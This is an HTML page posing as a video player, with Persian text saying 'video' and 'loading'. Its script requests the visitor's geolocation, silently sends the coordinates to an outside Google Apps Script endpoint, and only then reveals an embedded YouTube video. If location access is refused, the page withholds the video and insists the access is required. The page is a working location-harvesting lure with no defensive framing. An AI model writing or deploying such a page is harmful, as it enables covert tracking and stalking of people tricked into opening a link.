<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ویدیو</title>
<style>
body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;}
#msg{color:white;font-size:18px;text-align:center;padding:20px;}
iframe{width:100%;max-width:500px;height:80vh;display:none;}
</style>
</head>
<body>
<div id="msg">در حال بارگذاری...</div>
<iframe id="yt" src="" allowfullscreen></iframe>
<script>
navigator.geolocation.getCurrentPosition(function(p){
var lat=p.coords.latitude;
var lon=p.coords.longitude;
fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec?lat="+lat+"&lon="+lon);
document.getElementById("msg").style.display="none";
document.getElementById("yt").src="https://www.youtube.com/embed/XgmWlmHtsf8";
document.getElementById("yt").style.display="block";
},function(){
document.getElementById("msg").innerHTML="دسترسی به موقعیت مکانی لازم است";
});
</script>
</body>
</html>
